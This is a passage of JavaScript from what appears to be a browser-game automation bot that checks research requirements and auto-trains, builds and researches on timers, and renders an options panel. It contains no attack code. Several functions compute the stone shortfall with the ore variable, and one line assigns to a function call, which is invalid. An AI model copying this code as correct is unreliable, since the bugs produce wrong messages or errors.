            return l
        },
        checkMercantilismReqs: function () {
            var t = Tabs.Jobs;
            var a = "Mercantilism";
            var b = t.getCurrentResearchLevel(a);
            var c = 3500 * Math.pow(2, b + 1);
            var d = 800 * Math.pow(2, b + 1);
            var f = 150 * Math.pow(2, b + 1);
            var g = 3000 * Math.pow(2, b + 1);
            var h = 200 * Math.pow(2, b + 1);
            var i = b + 1;
            var j = b + 1;
            var k = b + 1;
            var l = "";
            var n = "L." + (b + 1) + " : ";
            var m = Seed.cities[0];
            try {
                var o = Seed.requirements.research[a];
                c = o.level[b + 1].resources.gold;
                d = o.level[b + 1].resources.food;
                f = o.level[b + 1].resources.wood;
                g = o.level[b + 1].resources.ore;
                h = o.level[b + 1].resources.stone;
                i = o.level[b + 1].buildings.ScienceCenter;
                j = o.level[b + 1].buildings.Factory;
                k = o.level[b + 1].research.Levitation
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var p = {
                researchable: false,
                msg: []
            };
            var q = t.getResearchCap(a);
            if (b >= q) {
                l += translate("Capacity") + ": " + q + " + "
            }
            if (m.resources.gold < c) {
                l += translate("Gold") + ": " + (c - m.resources.gold) + " + "
            }
            if (m.resources.food < d) {
                l += translate("Food") + ": " + (d - m.resources.food) + " + "
            }
            if (m.resources.wood < f) {
                l += translate("Wood") + ": " + (f - m.resources.wood) + " + "
            }
            if (m.resources.ore < g) {
                l += translate("Ore") + ": " + (g - m.resources.ore) + " + "
            }
            if (m.resources.stone < h) {
                l += translate("Stone") + ": " + (g - m.resources.stone) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", i) === 0) {
                l += translate("ScienceCenter") + ": " + i + " + "
            }
            if (t.getBuildingLevel(0, "Factory", j) === 0) {
                l += translate("Factory") + ": " + j + " + "
            }
            if (t.getCurrentResearchLevel("Levitation") < k) {
                l += translate("Levitation") + ": " + k + " + "
            }
            if (l.length === 0) {
                p.researchable = true;
                p.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                p.researchable = false;
                p.msg = n + l
            }
            return p
        },
        checkAerialCombatReqs: function () {
            var t = Tabs.Jobs;
            var a = "AerialCombat";
            var b = t.getCurrentResearchLevel(a);
            var c = 3500 * Math.pow(2, b + 1);
            var d = 2500 * Math.pow(2, b + 1);
            var f = 8;
            var g = 8;
            var h = 1;
            var i = 1;
            var j = 1;
            var k = 1;
            var l = "";
            var n = "L." + (b + 1) + " : ";
            var m = Seed.cities[0];
            try {
                var o = Seed.requirements.research[a];
                c = o.level[b + 1].resources.gold;
                d = o.level[b + 1].resources.food;
                f = o.level[b + 1].buildings.DragonKeep;
                g = o.level[b + 1].research.Dragonry;
                h = o.level[b + 1].items.GreatDragonBodyArmor;
                i = o.level[b + 1].items.GreatDragonClawGuards;
                j = o.level[b + 1].items.GreatDragonHelmet;
                k = o.level[b + 1].items.GreatDragonTailGuard
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var p = {
                researchable: false,
                msg: []
            };
            var q = t.getResearchCap(a);
            if (b >= q) {
                l += translate("Capacity") + ": " + q + " + "
            }
            if (m.resources.gold < c) {
                l += translate("Gold") + ": " + (c - m.resources.gold) + " + "
            }
            if (m.resources.food < d) {
                l += translate("Food") + ": " + (d - m.resources.food) + " + "
            }
            if (t.getBuildingLevel(0, "DragonKeep", f) === 0) {
                l += translate("DragonKeep") + ": " + f + " + "
            }
            if (t.getCurrentResearchLevel("Dragonry") < g) {
                l += translate("Dragonry") + ": " + g + " + "
            }
            if (t.getItem("GreatDragonBodyArmor") === 0) {
                l += translate("GreatDragonBodyArmor") + ": " + h + " + "
            }
            if (t.getItem("GreatDragonClawGuards") === 0) {
                l += translate("GreatDragonClawGuards") + ": " + i + " + "
            }
            if (t.getItem("GreatDragonHelmet") === 0) {
                l += translate("GreatDragonHelmet") + ": " + j + " + "
            }
            if (t.getItem("GreatDragonTailGuard") === 0) {
                l += translate("GreatDragonTailGuard") + ": " + k + " + "
            }
            if (l.length === 0) {
                p.researchable = true;
                p.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                p.researchable = false;
                p.msg = n + l
            }
            return p
        },
        checkEnergyCollectionReqs: function () {
            var t = Tabs.Jobs;
            var a = "EnergyCollection";
            var b = t.getCurrentResearchLevel(a);
            var c = 5000 * Math.pow(2, b + 1);
            var d = 200 * Math.pow(2, b + 1);
            var f = 400 * Math.pow(2, b + 1);
            var g = 400 * Math.pow(2, b + 1);
            var h = 400 * Math.pow(2, b + 1);
            var i = "";
            var n = "L." + (b + 1) + " : ";
            var j = Seed.cities[0];
            try {
                var k = Seed.requirements.research[a];
                c = k.level[b + 1].resources.gold;
                d = k.level[b + 1].resources.food;
                f = k.level[b + 1].resources.wood;
                g = k.level[b + 1].resources.ore;
                h = k.level[b + 1].resources.stone
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var l = {
                researchable: false,
                msg: []
            };
            var m = t.getResearchCap(a);
            if (b >= m) {
                i += translate("Capacity") + ": " + m + " + "
            }
            if (j.resources.gold < c) {
                i += translate("Gold") + ": " + (c - j.resources.gold) + " + "
            }
            if (j.resources.food < d) {
                i += translate("Food") + ": " + (d - j.resources.food) + " + "
            }
            if (j.resources.wood < f) {
                i += translate("Wood") + ": " + (f - j.resources.wood) + " + "
            }
            if (j.resources.ore < g) {
                i += translate("Ore") + ": " + (g - j.resources.ore) + " + "
            }
            if (j.resources.stone < h) {
                i += translate("Stone") + ": " + (g - j.resources.stone) + " + "
            }
            if (i.length == 0) {
                l.researchable = true;
                l.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                l.researchable = false;
                l.msg = n + i
            }
            return l
        },
        checkWarriorRevivalReqs: function () {
            var t = Tabs.Jobs;
            var a = "WarriorRevival";
            var b = t.getCurrentResearchLevel(a);
            var c = 10000 * Math.pow(2, b + 1);
            var d = 200 * Math.pow(2, b + 1);
            var f = 400 * Math.pow(2, b + 1);
            var g = 400 * Math.pow(2, b + 1);
            var h = 200 * Math.pow(2, b + 1);
            var i = "";
            var n = "L." + (b + 1) + " : ";
            var j = Seed.cities[0];
            try {
                var k = Seed.requirements.research[a];
                c = k.level[b + 1].resources.gold;
                d = k.level[b + 1].resources.food;
                f = k.level[b + 1].resources.wood;
                g = k.level[b + 1].resources.ore;
                h = k.level[b + 1].resources.stone
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var l = {
                researchable: false,
                msg: []
            };
            var m = t.getResearchCap(a);
            if (b >= m) {
                i += translate("Capacity") + ": " + m + " + "
            }
            if (j.resources.gold < c) {
                i += translate("Gold") + ": " + (c - j.resources.gold) + " + "
            }
            if (j.resources.food < d) {
                i += translate("Food") + ": " + (d - j.resources.food) + " + "
            }
            if (j.resources.wood < f) {
                i += translate("Wood") + ": " + (f - j.resources.wood) + " + "
            }
            if (j.resources.ore < g) {
                i += translate("Ore") + ": " + (g - j.resources.ore) + " + "
            }
            if (j.resources.stone < h) {
                i += translate("Stone") + ": " + (g - j.resources.stone) + " + "
            }
            if (i.length == 0) {
                l.researchable = true;
                l.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                l.researchable = false;
                l.msg = n + i
            }
            return l
        },
        checkGuardianRevivalReqs: function () {
            var t = Tabs.Jobs;
            var a = "GuardianRevival";
            var b = t.getCurrentResearchLevel(a);
            var c = 10000 * Math.pow(2, b + 1);
            var d = 200 * Math.pow(2, b + 1);
            var f = 400 * Math.pow(2, b + 1);
            var g = 400 * Math.pow(2, b + 1);
            var h = 200 * Math.pow(2, b + 1);
            var i = "";
            var n = "L." + (b + 1) + " : ";
            var j = Seed.cities[0];
            try {
                var k = Seed.requirements.research[a];
                c = k.level[b + 1].resources.gold;
                d = k.level[b + 1].resources.food;
                f = k.level[b + 1].resources.wood;
                g = k.level[b + 1].resources.ore;
                h = k.level[b + 1].resources.stone
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var l = {
                researchable: false,
                msg: []
            };
            var m = t.getResearchCap(a);
            if (b >= m) {
                i += translate("Capacity") + ": " + m + " + "
            }
            if (j.resources.gold < c) {
                i += translate("Gold") + ": " + (c - j.resources.gold) + " + "
            }
            if (j.resources.food < d) {
                i += translate("Food") + ": " + (d - j.resources.food) + " + "
            }
            if (j.resources.wood < f) {
                i += translate("Wood") + ": " + (f - j.resources.wood) + " + "
            }
            if (j.resources.ore < g) {
                i += translate("Ore") + ": " + (g - j.resources.ore) + " + "
            }
            if (j.resources.stone < h) {
                i += translate("Stone") + ": " + (g - j.resources.stone) + " + "
            }
            if (i.length == 0) {
                l.researchable = true;
                l.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                l.researchable = false;
                l.msg = n + i
            }
            return l
        },
        checkResearchReqs: function (a) {
            var t = Tabs.Jobs;
            var b;
            var c = t.getCurrentResearchLevel(a);
            var d = t.getResearchCap(a);
            if (c < d) {
                switch (a) {
                case "Agriculture":
                    b = t.checkAgricultureReqs();
                    break;
                case "Woodcraft":
                    b = t.checkWoodcraftReqs();
                    break;
                case "Masonry":
                    b = t.checkMasonryReqs();
                    break;
                case "Mining":
                    b = t.checkMiningReqs();
                    break;
                case "Clairvoyance":
                    b = t.checkClairvoyanceReqs();
                    break;
                case "RapidDeployment":
                    b = t.checkRapidDeploymentReqs();
                    break;
                case "Ballistics":
                    b = t.checkBallisticsReqs();
                    break;
                case "Metallurgy":
                    b = t.checkMetallurgyReqs();
                    break;
                case "Medicine":
                    b = t.checkMedicineReqs();
                    break;
                case "Dragonry":
                    b = t.checkDragonryReqs();
                    break;
                case "Levitation":
                    b = t.checkLevitationReqs();
                    break;
                case "Mercantilism":
                    b = t.checkMercantilismReqs();
                    break;
                case "AerialCombat":
                    b = t.checkAerialCombatReqs();
                    break;
                case "EnergyCollection":
                    b = t.checkEnergyCollectionReqs();
                    break;
                case "WarriorRevival":
                    b = t.checkWarriorRevivalReqs();
                    break;
                case "GuardianRevival":
                    b = t.checkGuardianRevivalReqs();
                    break
                }
                if (b.researchable === false) {
                    if (t.content_type === 3) {
                        try {
                            $id(UID["tabJobResearch_FB_" + a]).innerHTML = "<font color=#C33>" + b.msg.replace(/:\+/, ":").replace(/\+\s*$/, "") + "</font>";
                            $id(UID["tabJobResearch_FB_" + a]).title = translate(a) + " " + b.msg.replace(/\+/g, " \n");
                            $id(UID["tabJobResearch_Sel_" + a]).style.color = "#C33"
                        } catch (e) {}
                    }
                } else {
                    if (t.content_type === 3) {
                        try {
                            var f = translate("Next level") + " " + translate("OK");
                            $id(UID["tabJobResearch_FB_" + a]).innerHTML = f;
                            $id(UID["tabJobResearch_FB_" + a]).title = translate(a) + " \n" + f
                        } catch (e) {}
                    }
                }
                return b
            } else {
                if (t.content_type === 3) {
                    try {
                        var f = translate("Task Completed");
                        $id(UID["tabJobResearch_FB_" + a]).innerHTML = "<font color=#0B0>" + f + "</font>";
                        $id(UID["tabJobResearch_FB_" + a]) = translate(a) + " \n" + f;
                        $id(UID["tabJobResearch_Sel_" + a]).style.color = "#060"
                    } catch (e) {}
                }
            }
            return false
        },
        trainTick: function (a) {
            var t = Tabs.Jobs;
            if (!Data.options.training.enabled) {
                return
            }
            if (isNaN(a) || a < 0 || a >= Seed.cities.length) {
                a = 0
            }
            if (!Seed.cities[a]) {
                t.trainTick(a + 1);
                return
            }
            clearTimeout(t.train_timer);
            t.train_timer = setTimeout(t.trainTick, 3000, a + 1);
            units_length = t.city[a].units_type.length;
            if (Data.options.training.mode === "min_housing") {
                if (getTrainJob(a) === null) {
                    t.attemptTrainShortQ(a, 0, units_length)
                }
            } else {
                t.attemptTrainLongQ(a, 0, units_length)
            }
        },
        build_tick: function () {
            var t = Tabs.Jobs;
            if (!Data.options.building.enabled) {
                return
            }
            var c = false;
            var d = {
                noPlayer: true
            };
            for (var e = 0; e < Seed.cities.length; e++) {
                var f = Seed.cities[e];
                if (!f) {
                    continue
                }
                var g = f.id;
                var h = getBuildJob(e);
                if (h === null) {
                    for (var i = 0; i < Data.options.train_jobs.length; i++) {
                        if (Data.options.train_jobs[i].city_id === g) {
                            if (Data.options.train_jobs[i].done || !Data.options.train_jobs[i].duration || Data.options.train_jobs[i].run_at + Data.options.train_jobs[i].duration > serverTime()) {
                                Data.options.train_jobs.splice(i, 1);
                                if (!d.cities) {
                                    d.cities = []
                                }
                                if (e !== 0) {
                                    d.cities.push(Seed.cities[0].id)
                                }
                                d.cities.push(f.id);
                                Seed.fetchPlayer(d);
                                clearTimeout(t.build_timer);
                                t.build_timer = setInterval(t.build_tick, 5000);
                                return
                            }
                        }
                    }
                    var j = [];
                    var k = [];
                    for (var l in Data.options.building.level_enable[e]) {
                        if (Data.options.building.level_enable[e][l]) {
                            k = Buildings.getList(e, l);
                            k.sort(function (a, b) {
                                return a.level - b.level
                            });
                            j = j.concat(k)
                        }
                    }
                    j.sort(function (a, b) {
                        return a.level - b.level
                    });
                    var m = false;
                    for (var i = 0; i < j.length; i++) {
                        var n = t.checkBuildReqs(e, j[i].type);
                        if (n) {
                            if (t.content_type === 2) {
                                t.dispFeedback(n.msg)
                            }
                            if (n.buildable) {
                                t.doBuild(j[i], f);
                                m = true;
                                Data.options.train_jobs.push(j[i]);
                                break
                            } else {
                                if (n.isCapped) {
                                    j.splice(i, 1)
                                }
                                if (t.content_type === 2) {
                                    t.dispFeedback(j[i].type + " " + n.msg)
                                }
                            }
                        }
                    }
                    if (m === false && j.length) {
                        c = true;
                        if (!d.cities) {
                            d.cities = []
                        }
                        d.cities.push(g)
                    }
                } else {
                    if (h) {
                        var o = false;
                        for (var i = 0; i < Data.options.train_jobs.length; i++) {
                            if (h.city_building_id === Data.options.train_jobs[i].city_building_id) {
                                o = true
                            }
                        }
                        if (!o) {
                            Data.options.train_jobs.push(h);
                            verboseLog("Putting build job in persistent data")
                        } else {
                            var p = getBuildingById(e, h.city_building_id);
                            var q = translate("Building") + ": " + translate(p) + " " + translate("Level").toLowerCase() + " " + h.level + " " + translate("at") + " " + translate(f.type);
                            if (t.content_type === 2) {
                                t.dispFeedback(q)
                            }
                        }
                    }
                }
            }
            if (c) {
                Seed.fetchPlayer(d);
                clearTimeout(t.build_timer);
                t.build_timer = setInterval(t.build_tick, t.build_retry_time);
                if (t.content_type === 2) {
                    t.dispFeedback(translate("Completion errors") + ": " + translate("Waiting") + " " + timeFormat(t.build_retry_time / 1000) + " " + translate("to try again"))
                }
                t.build_retry_time *= 1.5;
                return
            }
        },
        researchTick: function () {
            var t = Tabs.Jobs;
            if (!Data.options.research.enabled) {
                return
            }
            var c = false;
            var d = Seed.cities[0].id;
            var e = getResearchJob(0);
            if (e === null) {
                for (var i = 0; i < Data.options.build_jobs.length; i++) {
                    if (Data.options.build_jobs[i]) {
                        if (Data.options.build_jobs[i].done || !Data.options.build_jobs[i].duration || Data.options.build_jobs[i].run_at + Data.options.build_jobs[i].duration > serverTime()) {
                            Data.options.build_jobs.splice(i, 1);
                            Seed.fetchPlayer({
                                cities: [d]
                            });
                            clearTimeout(t.research_timer);
                            t.research_timer = setInterval(t.researchTick, 5000);
                            return
                        }
                    }
                }
                var f = [];
                for (var i = 0; i < t.research_type.length; i++) {
                    var g = t.research_type[i];
                    var h = (Seed.player.research[g] !== undefined ? Seed.player.research[g] : 0);
                    if (Data.options.research.level_enable[g] && Data.options.research.level_cap[g] > h) {
                        f.push({
                            type: g,
                            level: h
                        })
                    }
                }
                f.sort(function (a, b) {
                    return a.level - b.level
                });
                var j = false;
                var k = 0;
                for (var i = 0; i < f.length; i++) {
                    var l = t.checkResearchReqs(f[i].type);
                    if (l) {
                        if (l.researchable) {
                            t.doResearch(f[i].type, f[i].level);
                            j = true;
                            Data.options.build_jobs.push(e);
                            break
                        } else {
                            if (t.content_type === 3) {
                                t.dispFeedback(f[i].type + " " + l.msg);
                                ++k
                            }
                        }
                    }
                }
                if (j === false && k) {
                    c = true
                }
            } else {
                if (e) {
                    var m = false;
                    for (var i = 0; i < Data.options.build_jobs.length; i++) {
                        if (Data.options.build_jobs[i] !== undefined && Data.options.build_jobs[i].id === e.id) {
                            m = true
                        }
                    }
                    if (!m) {
                        Data.options.build_jobs.push(e);
                        verboseLog("Putting research job in persistent data")
                    }
                }
            }
            if (c) {
                Seed.fetchPlayer({
                    cities: [d]
                });
                clearTimeout(t.research_timer);
                t.research_timer = setInterval(t.researchTick, t.res_retry_time);
                if (t.content_type === 3) {
                    t.dispFeedback(translate("Completion errors") + ": " + translate("Waiting") + " " + timeFormat(t.res_retry_time / 1000) + " " + translate("to try again"))
                }
                t.res_retry_time *= 1.5
            }
        },
        attemptTrainShortQ: function (a, b, c) {
            var t = Tabs.Jobs;
            var d = false;
            if (!getTrainJob(a)) {
                var f = {
                    noPlayer: true
                };
                for (i = 0; i < t.city[a].units_type.length; i++) {
                    var g = t.city[a].units_type[i];
                    var h = Data.options.training.city[a].units[g];
                    var j = t.getUnitCap(g, h);
                    try {
                        if (j) {
                            h = 0;
                            if (t.content_type === 1) {
                                t.dispFeedback(translate("Troops Capped"))
                            }
                            $id(UID["tabTrain_Unit_" + a + "_" + i]).style.backgroundColor = "#faa"
                        } else {
                            if ($id(UID["tabTrain_Unit_" + a + "_" + i]).style.backgroundColor === "#faa") {
                                $id(UID["tabTrain_Unit_" + a + "_" + i]).style.backgroundColor = "white"
                            }
                        }
                    } catch (e) {}
                    if (h > 0) {
                        var k = t.checkTrainReqs(g, h, a, b, c);
                        if (t.content_type === 1) {
                            t.dispFeedback(k.msg)
                        }
                        if (k.trainable) {
                            t.doTrain(g, h, a)
                        } else {
                            if (!f.cities) {
                                f.cities = []
                            }
                            f.cities.push(Seed.cities[a].id);
                            d = true;
                            break
                        }
                    }
                }
            }
            if (d) {
                verboseLog("attemptTrainShortQ do_recheck");
                clearTimeout(t.train_timer);
                t.train_timer = setTimeout(t.trainTick, 4000, a + 1);
                if (a == 0) {
                    setTimeout(Seed.fetchPlayer, 290000, f);
                    clearTimeout(t.train_timer);
                    t.train_timer = setTimeout(t.trainTick, 300000, a + 1)
                }
            }
        },
        attemptTrainLongQ: function (a, b, c) {
            var t = Tabs.Jobs;
            var d = false;
            var f = {
                noPlayer: true
            };
            for (i = 0; i < t.city[a].units_type.length; i++) {
                var g = t.city[a].units_type[i];
                var h = Data.options.training.city[a].units[g];
                var j = t.getUnitCap(g, h);
                try {
                    if (j) {
                        h = 0;
                        if (t.content_type === 1) {
                            t.dispFeedback(translate("Troops Capped"))
                        }
                        $id(UID["tabTrain_Unit_" + a + "_" + i]).style.backgroundColor = "#faa"
                    } else {
                        if ($id(UID["tabTrain_Unit_" + a + "_" + i]).style.backgroundColor === "#faa") {
                            $id(UID["tabTrain_Unit_" + a + "_" + i]).style.backgroundColor = "white"
                        }
                    }
                } catch (e) {}
                if (h > 0) {
                    var k = t.checkTrainReqs(g, h, a, b, c);
                    if (t.content_type === 1) {
                        t.dispFeedback(k.msg)
                    }
                    if (k.trainable) {
                        t.train_jobs.push({
                            unit_type: g,
                            unit_quantity: h,
                            city_idx: a,
                            units_length: c
                        })
                    } else {
                        if (!f.cities) {
                            f.cities = []
                        }
                        f.cities.push(Seed.cities[a].id);
                        d = true;
                        break
                    }
                }
            }
            if (d) {
                verboseLog("attemptTrainLongQ do_recheck");
                clearTimeout(t.train_timer);
                t.train_timer = setTimeout(t.trainTick, 4000, a + 1);
                if (a == 0) {
                    setTimeout(Seed.fetchPlayer, 290000, f);
                    clearTimeout(t.train_timer);
                    t.train_timer = setTimeout(t.trainTick, 300000, a + 1)
                }
            }
            var l = 0;
            for (var a = 0; a < Seed.cities.length; a++) {
                if (!Seed.cities[a]) {
                    continue
                }
                l += t.getRemainingQueue(a, "units")
            }
            if (l) {
                t.runJobs()
            }
        },
        runJobs: function () {
            var t = Tabs.Jobs;
            if (t.train_jobs.length > 0) {
                for (var a = 0; a < Seed.cities.length; a++) {
                    if (!Seed.cities[a]) {
                        continue
                    }
                    var b = [];
                    for (var i = 0; i < t.train_jobs.length; i++) {
                        if (t.train_jobs[i].city_idx === a) {
                            b[i] = t.train_jobs[i]
                        }
                    }
                    var c = t.getRemainingQueue(a, "units");
                    var d = b.length;
                    if (c >= d) {
                        for (var i = 0; i < d; i++) {
                            var e = b.shift();
                            t.doTrain(e.unit_type, e.unit_quantity, a)
                        }
                    }
                    t.train_jobs.splice(0, d)
                }
                setTimeout(t.runJobs, 3000)
            }
        },
        doTrain: function (a, b, c) {
            var t = Tabs.Jobs;
            var d = Seed.cities[c];
            var e = translate("Training") + ": (" + b + ") " + translate(a) + " " + translate("at") + " " + translate(d.name);
            MyAjax.unitTraining(a, b, d.id, function (r) {
                clearTimeout(t.train_timer);
                if (r.ok) {
                    t.train_errors = 0;
                    actionLog(e);
                    t.train_timer = setTimeout(t.trainTick, Math.randRange(7000, 13000), c + 1)
                } else {
                    verboseLog("Error: Training: " + r.errmsg);
                    actionLog(translate("Error") + " " + translate("Training") + ": " + r.errmsg);
                    if (++t.train_errors > 5) {
                        if (t.content_type === 1) {
                            t.dispFeedback(translate("Too many errors, disabling auto training"))
                        }
                        t.setTrainEnable(false);
                        t.train_errors = 0
                    } else {
                        if (t.content_type === 1) {
                            t.dispFeedback(translate("Error") + " " + translate("Training") + ": " + r.errmsg)
                        }
                        t.train_timer = setTimeout(t.trainTick, t.train_retry_time, c);
                        t.train_retry_time *= 1.5
                    }
                }
                Seed.updateCity(r.dat.result.city);
                if (r.dat.result.city.id !== Seed.cities[0].id) {
                    Seed.fetchCity(Seed.cities[0].id)
                }
            })
        },
        doBuild: function (a, b) {
            var t = Tabs.Jobs;
            var c = translate("Building") + ": " + translate(a.type) + " " + translate("Level").toLowerCase() + " " + (a.level + 1) + " " + translate("at") + " " + translate(b.name);
            if (t.content_type === 2) {
                t.dispFeedback(c)
            }
            MyAjax.buildingUpgrade(b.id, a.id, function (r) {
                if (r.ok) {
                    t.build_errors = 0;
                    actionLog(c);
                    clearTimeout(t.build_timer);
                    t.build_timer = setInterval(t.build_tick, 4000);
                    return
                } else {
                    Seed.fetchPlayer({
                        cities: [b.id]
                    });
                    actionLog(a.type + ": " + r.errmsg);
                    if (++t.build_errors > 5) {
                        if (t.content_type === 2) {
                            t.dispFeedback(translate("Too many errors, disabling auto-build"))
                        }
                        t.setBuildEnable(false);
                        t.build_errors = 0;
                        return
                    }
                    if (t.content_type === 2) {
                        t.dispFeedback(translate(a.type) + ": " + r.errmsg)
                    }
                    clearTimeout(t.build_timer);
                    t.build_timer = setInterval(t.build_tick, t.build_retry_time);
                    return
                }
            })
        },
        doResearch: function (a, b) {
            var t = Tabs.Jobs;
            var c = Seed.cities[0];
            var d = "<b>" + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") ";
            if (t.content_type === 3) {
                t.dispFeedback(d)
            }
            actionLog(translate("Research Started") + ": " + translate(a) + " (" + (b + 1) + ") ");
            MyAjax.researchStart(c.id, a, function (r) {
                if (r.ok) {
                    t.research_errors = 0;
                    actionLog(d);
                    return
                } else {
                    Seed.fetchPlayer({
                        cities: [c.id]
                    });
                    actionLog(translate("Research Error").toUpperCase() + ": " + r.errmsg);
                    if (++t.research_errors > 5) {
                        if (t.content_type === 3) {
                            t.dispFeedback(translate("Too many errors, disabling auto-research"))
                        }
                        t.setResearchEnable(false);
                        t.research_errors = 0;
                        return
                    }
                    if (t.content_type === 3) {
                        t.dispFeedback(translate(a) + ": " + r.errmsg)
                    }
                    return
                }
            })
        }
    };
    Tabs.Options = {
        tab_order: L,
        tab_label: "Options",
        tab_disabled: !S,
        $container: null,
        init: function (b) {
            var t = Tabs.Options;
            t.$container = $J(b);
            var c = ["", "", "", ""],
                sel_auto_refresh = ["", "", "", ""];
            switch (Data.options.auto_collect.unit) {
            case 1:
                c[0] = "selected";
                break;
            case 60:
                c[1] = "selected";
                break;
            case 3600:
                c[2] = "selected";
                break;
            case 86400:
                c[3] = "selected";
                break;
            default:
                c[2] = "selected"
            }
            switch (parseInt(Data.options.auto_refresh.delay)) {
            case 10:
                sel_auto_refresh[0] = "selected";
                break;
            case 15:
                sel_auto_refresh[1] = "selected";
                break;
            case 20:
                sel_auto_refresh[2] = "selected";
                break;
            case 25:
                sel_auto_refresh[3] = "selected";
                break;
            default:
                sel_auto_refresh[0] = "selected"
            }
            try {
                html = "<div class=" + UID.title + ' style="margin-bottom:10px">' + translate("Options") + "</div><table><tr valign=top><td><b>" + translate("Game Options") + ": </b></td></tr><tr valign=top><td><label><input id=" + setUID("tabOptions_Collect") + " type=checkbox /> " + translate("Auto-Collection of Resources") + "</label> <input id=" + setUID("tabOptions_collectTime") + ' size=1 maxlength=2 type=text value="' + Data.options.auto_collect.delay + '" /><select id=' + setUID("tabOptions_collectUnit") + " size=1><option value=1 " + c[0] + ">" + translate("Seconds") + "</option><option value=60 " + c[1] + ">" + translate("Minutes") + "</option><option value=3600 " + c[2] + ">" + translate("Hours") + "</option><option value=86400 " + c[3] + ">" + translate("Days") + "</option></select></td></tr></table><br><HR><table><tr valign=top><td><b>" + translate("Script Options") + ": </b></td></tr><tr valign=top><td><label><input id=" + setUID("tabOptions_Drag") + " type=checkbox /> " + translate("Enable") + " " + translate("Window drag") + "</label></td></tr><tr valign=top><td><label><input id=" + setUID("tabOptions_Verbose") + " type=checkbox /> " + translate("Enable") + " " + translate("Verbose logging") + "</label></td></tr><tr valign=top><td><label><input id=" + setUID("tabOptions_AutoRefresh") + " type=checkbox /> " + translate("Enable") + " " + translate("Auto Refresh every") + "</label><select id=" + setUID("tabOptions_AutoRefreshDelay") + " size=1><option value=10 " + sel_auto_refresh[0] + ">10</option><option value=15 " + sel_auto_refresh[1] + ">15</option><option value=20 " + sel_auto_refresh[2] + ">20</option><option value=25 " + sel_auto_refresh[3] + ">25</option></select> " + translate("Minutes") + " " + translate("of inactivity") + "</td></tr><tr valign=top><td><br><label>" + translate("Delete") + " " + translate("Permanent Data") + ": <input id=" + setUID("tabOptions_btnClearStorage") + ' type=button value="' + translate("Delete") + '" /></label></td></tr></table><br><HR><table><tr valign=top><td><label><input id=' + setUID("tabOptions_btnRefresh") + ' type=button value="' + translate("Refresh") + '" /></label></td></tr></table><br><HR>';
                t.$container.html(html);
                t.checkboxChange(UID.tabOptions_Collect, Data.options.auto_collect.enabled, AutoCollect.setEnable);
                $J("#" + UID.tabOptions_collectTime).change(onChangeTime);
                $J("#" + UID.tabOptions_collectUnit).change(onChangeUnit);
                t.checkboxChange(UID.tabOptions_Drag, Data.options.main_box.draggable, onChangeDrag);
                t.checkboxChange(UID.tabOptions_Verbose, Data.options.verbose_log.enabled, VerboseLog.setEnable);
                t.checkboxChange(UID.tabOptions_AutoRefresh, Data.options.auto_refresh.enabled, AutoRefresh.setEnable);
                $J("#" + UID.tabOptions_AutoRefreshDelay).change(onChangeRefreshDelay);
                $J("#" + UID.tabOptions_btnClearStorage).click(onClickClearStorage);
                $J("#" + UID.tabOptions_btnRefresh).click(onClickRefreshData)
            } catch (e) {
                t.$container.html("<PRE>" + e.name + " : " + e.message + "</pre>")
            }
            function onChangeTime(a) {
                Data.options.auto_collect.delay = parseIntZero($id(UID.tabOptions_collectTime).value)
            }
            function onChangeUnit(a) {
                Data.options.auto_collect.unit = parseIntZero($id(UID.tabOptions_collectUnit).value)
            }
            function onChangeRefreshDelay(a) {
                AutoRefresh.setDelay(parseIntZero($id(UID.tabOptions_AutoRefreshDelay).value))
            }
            function onChangeDrag(a) {
                Data.options.main_box.draggable = a;
                $main_box.option("draggable", a)
            }
            function onClickClearStorage() {
                dialogBox({
                    id: setUID("dialog-confirm"),
                    centerTo: t.$container,
                    title: translate("Delete") + " " + translate("Permanent Data"),
                    html: "<br>" + translate("Are you sure you want to") + " " + translate("delete") + "<br>" + translate("All") + " " + translate("Permanent Data") + "?",
                    buttons: [{
                        text: translate("Ok"),
                        click: function () {
                            Data.clearStorage();
                            $J(this).dialog("destroy")
                        }
                    }, {
                        text: translate("Cancel"),
                        click: function () {
                            $J(this).dialog("destroy")
                        }
                    }]
                })
            }
            function onClickRefreshData() {
                var t = Tabs.Options;
                Seed.fetchPlayer()
            }
        },
        hide: function () {},
        show: function () {},
        checkboxChange: function (g, h, i, j) {
            var t = Tabs.Options;
            var k = $id(g);
            if (j && j() === false) {
                k.disabled = true;
                return
            }
            if (h) {
                k.checked = true
            }
            $J(k).change(new eventToggle(g, h, i).handler);

            function eventToggle(b, c, d) {
                this.handler = handler;
                var e = c;
                var f = d;

                function handler(a) {
                    e = this.checked;
                    if (f !== null) {
                        f(this.checked)
                    }
                }
            }
        },
    };
    Tabs.Log = {
        tab_order: K,
        tab_label: "Logs",
        tab_disabled: !R,
        last_subtab: "tabLogActions",
        $container: null,
        content: [],
        title: null,
        max_entries: 1000,
        stats_timer: 0,
        state: 0,
        init: function (a) {
            var t = Tabs.Log;
            t.$container = $J(a);
